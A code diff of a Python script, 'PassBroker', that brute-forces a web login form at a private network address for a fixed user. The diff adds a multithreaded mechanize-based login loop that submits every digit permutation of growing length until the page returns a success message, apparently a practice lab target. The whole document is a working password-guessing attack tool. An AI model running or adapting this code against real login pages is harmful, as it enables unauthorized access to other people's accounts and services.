@@ -1,15 +1,15 @@
 import os
-import sys
-
+import itertools, queue, threading
+import mechanize
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
-import itertools, queue, threading
 
 URL = "http://192.168.1.35/"
-CHARS = ["0", "1", "2", "3", "4", "5"]
+CHARS = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
 USER = "manolo"
-N = 30
+PASS_LENG = 5
+N = 10
 
 def queueTrhead(pb, queue):
     while True:
@@ -17,23 +17,26 @@ def queueTrhead(pb, queue):
         pb.login(password)
         queue.task_done()
 
+def queueTrhead_mechanized(pb, queue):
+    while True:
+        password = queue.get()
+        pb.loginMechanize(password)
+        queue.task_done()
+
 class PassBroker:
     URL = ""
     USER = ""
     CHARS = ""
     N = 0
+    PASS_LENG = 1
     queue = queue.Queue()
 
-    def __init__(self, URL, USER, CHARS):
-        self.URL = URL
-        self.USER = USER
-        self.CHARS = CHARS
-
-    def __init__(self, URL, USER, CHARS, N):
+    def __init__(self, URL, USER, CHARS, N, PASS_LENG):
         self.URL = URL
         self.USER = USER
         self.CHARS = CHARS
         self.N = N
+        self.PASS_LENG = PASS_LENG
 
     def login(self, tupleOfPasswords):
         chrome_options = Options()
@@ -50,6 +53,20 @@ class PassBroker:
             os._exit(1)
         driver.close()
 
+    def loginMechanize(self, tupleOfPasswords):
+        br = mechanize.Browser()
+        br.open("http://192.168.1.35/")
+        password = ''.join(tupleOfPasswords)
+        br.select_form(nr=0)
+        br["user"] = self.USER
+        br["password"] = password
+        response = br.submit()
+        html = response.read().decode("utf-8")
+        if "Congratulations!!! :-)" in html:
+            br.close()
+            print("Password found: ", password)
+            os._exit(1)
+
     def basicBF(self):
         i = 0
         while i < len(self.CHARS):
@@ -64,10 +81,23 @@ class PassBroker:
             th = threading.Thread(target=queueTrhead, args=(self, self.queue))
             th.setDaemon(True)
             th.start()
-        for i in range(len(self.CHARS)):
-            permutations = list(itertools.permutations(self.CHARS, i))
+        while self.PASS_LENG <= len(self.CHARS):
+            permutations = list(itertools.permutations(self.CHARS, self.PASS_LENG))
             for permutation in permutations:
                 self.queue.put(permutation)
+            self.PASS_LENG += 1
+        self.queue.join()
+
+    def parallelizedBF_mechanized(self):
+        for i in range(self.N):
+            th = threading.Thread(target=queueTrhead_mechanized, args=(self, self.queue))
+            th.setDaemon(True)
+            th.start()
+        while self.PASS_LENG <= len(self.CHARS):
+            permutations = list(itertools.permutations(self.CHARS, self.PASS_LENG))
+            for permutation in permutations:
+                self.queue.put(permutation)
+            self.PASS_LENG += 1
         self.queue.join()
 
 """
@@ -75,5 +105,15 @@ pb = PassBroker(URL, USER, CHARS)
 pb.basicBF()
 """
 
+"""
 pb = PassBroker(URL, USER, CHARS, N)
 pb.parallelizedBF()
+"""
+
+"""
+pb = PassBroker(URL, USER, CHARS, N, PASS_LENG)
+pb.parallelizedBF()
+"""
+
+pb = PassBroker(URL, USER, CHARS, N, 5)
+pb.parallelizedBF_mechanized()
